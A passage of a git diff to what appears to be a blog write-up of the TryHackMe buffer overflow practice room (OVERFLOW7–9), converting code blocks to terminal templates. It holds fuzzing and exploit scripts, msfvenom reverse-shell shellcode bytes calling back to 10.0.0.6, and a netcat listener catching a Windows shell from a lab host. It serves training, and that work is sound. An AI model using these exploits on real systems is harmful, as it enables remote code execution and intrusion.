n1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of7patterncreate %}
 
 <br />
 Update the code with the pattern_create string that we just generated.
 
-{% raw %}
-```python
+{% capture of703 %}
 import socket
 
 url = '10.0.0.7'
@@ -3494,9 +3467,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of7_0x03.py' content=of703 %}
 
 <br />
 Check the EIP and note the value that is stored in the register.
@@ -3510,19 +3483,17 @@ Check the EIP and note the value that is stored in the register.
 <br />
 Run the string from the regster through msf-pattern_offset to get the exact offset.
 
-{% raw %}
-```bash
+{% capture of7findoffset %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW7]
 └─$ msf-pattern_offset -l 2000 -q 72423572                                                                                       
 [*] Exact match at offset 1306
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of7findoffset %}
 
 <br />
 Update the code to include the offset value that we just calculated.
 
-{% raw %}
-```python
+{% capture of704 %}
 import socket
 
 url = '10.0.0.7'
@@ -3540,15 +3511,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of7_0x04.py' content=of704 %}
 
 <br />
 Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.
 
-{% raw %}
-```python
+{% capture of705 %}
 import socket
 
 url = '10.0.0.7'
@@ -3586,9 +3556,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of7_0x05.py' content=of705 %}
 
 <br />
 Check the ESP register to view the baschars and find any mangles.
@@ -3602,8 +3572,7 @@ Check the ESP register to view the baschars and find any mangles.
 <br />
 Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.
 
-{% raw %}
-```python
+{% capture of706 %}
 import socket
 
 url = '10.0.0.7'
@@ -3644,8 +3613,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of7_0x06.py' content=of706 %}
 
 <br />
 Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.
@@ -3668,8 +3637,7 @@ Run nmod to get a list of modules and their security to find the appropriate mod
 <br />
 Update the code with the address that was discovered in the essfunc.dll.
 
-{% raw %}
-```python
+{% capture of707 %}
 import socket
 from struct import pack
 
@@ -3693,15 +3661,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of7_0x07.py' content=of707 %}
 
 <br />
 Use msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture of7generatepayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW7]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -b '\x00\x8c\xae\xbe\xfb' -v payload
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -3746,15 +3713,14 @@ payload += b"\x0d\xe3\xa4\xcf\x8b\xfa\x12\xa9\x3a\x79\xdd"
 payload += b"\xb6\x44\x47\x93\xce\x69\x4f\x64\x9c\xcf\xcf"
 payload += b"\x86\x63\x7e\x47\x3d\xdc\xc9\xb2\x64\x9c\x48"
 payload += b"\x29\xe7\x43\xf4\xd4\x7b\x3c\x71\x94\xdc\x5a"
-payload += b"\x06\x40\xf1\x49\x27\xd0\x4e" 
-```
-{% endraw %}
+payload += b"\x06\x40\xf1\x49\x27\xd0\x4e"
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of7generatepayload %}
 
 <br />
 Update the code with a nop sled and the payload we just generated.
 
-{% raw %}
-```python
+{% capture of708 %}
 import socket
 from struct import pack
 
@@ -3811,34 +3777,41 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of7_0x08.py' content=of708 %}
 
 <br />
 Start a netcat listener.  Run the code.  Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture of7catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW7]
 └─$ sudo nc -nlvp 443                         
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56187
+{% endcapture %}
+
+{% capture of7windowsshell %}
 Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Windows Kits\10\Debuggers>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=of7catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=of7windowsshell %}
 
 <br />
-<b><u>OVERFLOW8<br /></u></b>
+<div id="overflow8">
+    <b><u>OVERFLOW8<br /></u></b>
+</div>
 
+<br />
 Create a script that connects to the service and sends the OVERFLOW8 command mimicking normal usage.
 
-{% raw %}
-```python
+{% capture of800 %}
 import socket
 
 url = '10.0.0.7'
@@ -3853,14 +3826,13 @@ s.send(b'OVERFLOW8 aaaa\r\n')
 print(s.recv(1024))
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of8_0x00.py' content=of800 %}
 
 <br />
 Update the code to fuzz the command with increasing length to find the breakpoint.
 
-{% raw %}
-```python
+{% capture of801 %}
 import socket
 
 url = '10.0.0.7'
@@ -3882,16 +3854,15 @@ for inputBuffer in buffers:
     s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')
     s.recv(1024)
 
-    s.close() 
-```
-{% endraw %}
+    s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of8_0x01.py' content=of801 %}
 
 <br />
 Run the code and observe the breakpoint.
 
-{% raw %}
-```python
-= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW8/thm-overflow8_0x01.py
+{% capture of8findbreakpoint %}
+= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW8/of8findbreakpoint
 [*] Sending: 1
 [*] Sending: 100
 [*] Sending: 200
@@ -3911,8 +3882,8 @@ Run the code and observe the breakpoint.
 [*] Sending: 1600
 [*] Sending: 1700
 [*] Sending: 1800
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of8findbreakpoint %}
 
 <br />
 Check the EIP to ensure that we have control of EIP.
@@ -3926,8 +3897,7 @@ Check the EIP to ensure that we have control of EIP.
 <br />
 Update the script to hardcode the size that breaks the buffer.
 
-{% raw %}
-```python
+{% capture of802 %}
 import socket
 
 url = '10.0.0.7'
@@ -3944,8 +3914,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of8_0x02.py' content=of802 %}
 
 <br />
 Run the code and check EIP to ensure that we still have control.
@@ -3956,19 +3926,17 @@ Run the code and check EIP to ensure that we still have control.
     </div>
 </div>
 
-{% raw %}
-```bash
+{% capture of8patterncreate %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
 └─$ msf-pattern_create -l 2200
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C 
-```
-{% endraw %}
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of8patterncreate %}
 
 <br />
 Update the code with the pattern_create string that we just generated.
 
-{% raw %}
-```python
+{% capture of803 %}
 import socket
 
 url = '10.0.0.7'
@@ -3985,9 +3953,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of8_0x03.py' content=of803 %}
 
 <br />
 Check the EIP and note the value that is stored in the register.
@@ -4001,19 +3969,17 @@ Check the EIP and note the value that is stored in the register.
 <br />
 Run the string from the regster through msf-pattern_offset to get the exact offset.
 
-{% raw %}
-```bash
+{% capture of8findoffset %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
 └─$ msf-pattern_offset -l 2200 -q 68433568
 [*] Exact match at offset 1786
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of8findoffset %}
 
 <br />
 Update the code to include the offset value that we just calculated.
 
-{% raw %}
-```python
+{% capture of804 %}
 import socket
 
 url = '10.0.0.7'
@@ -4031,15 +3997,14 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of8_0x04.py' content=of804 %}
 
 <br />
 Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.
 
-{% raw %}
-```python
+{% capture of805 %}
 import socket
 
 url = '10.0.0.7'
@@ -4077,9 +4042,9 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of8_0x05.py' content=of805 %}
 
 <br />
 Check the ESP register to view the baschars and find any mangles.
@@ -4093,8 +4058,7 @@ Check the ESP register to view the baschars and find any mangles.
 <br />
 Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.
 
-{% raw %}
-```python
+{% capture of806 %}
 import socket
 
 url = '10.0.0.7'
@@ -4135,8 +4099,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of8_0x06.py' content=of806 %}
 
 <br />
 Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.
@@ -4159,8 +4123,7 @@ Run nmod to get a list of modules and their security to find the appropriate mod
 <br />
 Update the code with the address that was discovered in the essfunc.dll.
 
-{% raw %}
-```python
+{% capture of807 %}
 import socket
 from struct import pack
 
@@ -4185,14 +4148,13 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of8_0x07.py' content=of807 %}
 
 <br />
 Use msfvenom to generate a payload.
 
-{% raw %}
-```bash
+{% capture 0f8generatepayload %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
 └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -v payload -f python -b '\x00\x1d\x2e\xc7\xee'    
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -4235,15 +4197,14 @@ payload += b"\x80\x0d\x14\xdd\xea\x8d\x62\xe2\x26\x78\x8a"
 payload += b"\x53\x9f\x3d\xb5\x5c\x77\xca\xce\x80\xe7\x35"
 payload += b"\x05\x01\x07\xd4\x8f\x7c\xa0\x41\x5a\x3d\xad"
 payload += b"\x71\xb1\x02\xc8\xf1\x33\xfb\x2f\xe9\x36\xfe"
-payload += b"\x74\xad\xab\x72\xe4\x58\xcb\x21\x05\x49" 
-```
-{% endraw %}
+payload += b"\x74\xad\xab\x72\xe4\x58\xcb\x21\x05\x49"
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=0f8generatepayload %}
 
 <br />
 Update the code with a nop sled and the payload we just generated.
 
-{% raw %}
-```python
+{% capture of808 %}
 import socket
 from struct import pack
 
@@ -4300,34 +4261,41 @@ s.recv(1024)
 print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of8_0x08.py' content=of808 %}
 
 <br />
 Start a netcat listener.  Run the code.  Check the listener and catch the shell.
 
-{% raw %}
-```bash
+{% capture of8catchshell %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56200
+{% endcapture %}
+
+{% capture of8windowsshell %}
 Microsoft Windows [Version 10.0.19045.3803]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\Program Files\Windows Kits\10\Debuggers>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=of8catchshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=of8windowsshell %}
 
 <br />
-<b><u>OVERFLOW9<br /></u></b>
+<div id="overflow9">
+    <b><u>OVERFLOW9<br /></u></b>
+</div>
 
+<br />
 Create a script that connects to the service and sends the OVERFLOW9 command mimicking normal usage.
 
-{% raw %}
-```python
+{% capture of900 %}
 import socket
 
 url = '10.0.0.7'
@@ -4341,15 +4309,14 @@ print(s.recv(1024))
 s.send(b'OVERFLOW9 aaaa\r\n')
 print(s.recv(1024))
 
-s.close() 
-```
-{% endraw %}
+s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of9_0x00.py' content=of900 %}
 
 <br />
 Update the code to fuzz the command with increasing length to find the breakpoint.
 
-{% raw %}
-```python
+{% capture of901 %}
 import socket
 
 url = '10.0.0.7'
@@ -4371,16 +4338,15 @@ for inputBuffer in buffers:
     s.send(b'OVERFLOW9 ' + inputBuffer + b'\r\n')
     s.recv(1024)
 
-    s.close() 
-```
-{% endraw %}
+    s.close()
+{% endcapture %}
+{% include terminal.html language='python' title='of9_0x01.py' content=of901 %}
 
 <br />
 Run the code and observe the breakpoint.
 
-{% raw %}
-```python
-= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW9/thm-overflow9_0x01.py
+{% capture of9findbreakpoint %}
+= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW9/of9_0x01.py
 [*] Sending: 1
 [*] Sending: 100
 [*] Sending: 200
@@ -4398,8 +4364,8 @@ Run the code and observe the breakpoint.
 [*] Sending: 1400
 [*] Sending: 1500
 [*] Sending: 1600
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=of9findbreakpoint %}
 
 <br />
 Check the EIP to ensure that we have control of EIP.
@@ -4413,8 +4379,7 @@ Check the EIP to ensure that we have control of EIP.
 <br />
 Update the script to hardcode the size that breaks the buffer.
 
-{% raw %}
-```python
+{% capture of902 %}
 import socket
 
 url = '10.0.0.7'
@@ -4431,8 +4396,8 @@ print('[*] Sending: {size}'.format(size=len(inputBuffer)))
 s.sendall(b'OVERFLOW9 ' + inputBuffer + b'\r\n')
 
 s.close()
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='of9_0x02.py' content=of902 %}
 
 <br />
 Run the code and check EIP to ensure that we still have control.
@@ -4443,19 +4408,17 @@ Run the code and check EIP to ensure that we still have control.
     </div>
 </div>
 
-{% raw %}
-```bash
+{% capture of9patterncreate %}
 ┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW8]
 └─$ msf-pattern_create -l 2000                                                                  
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg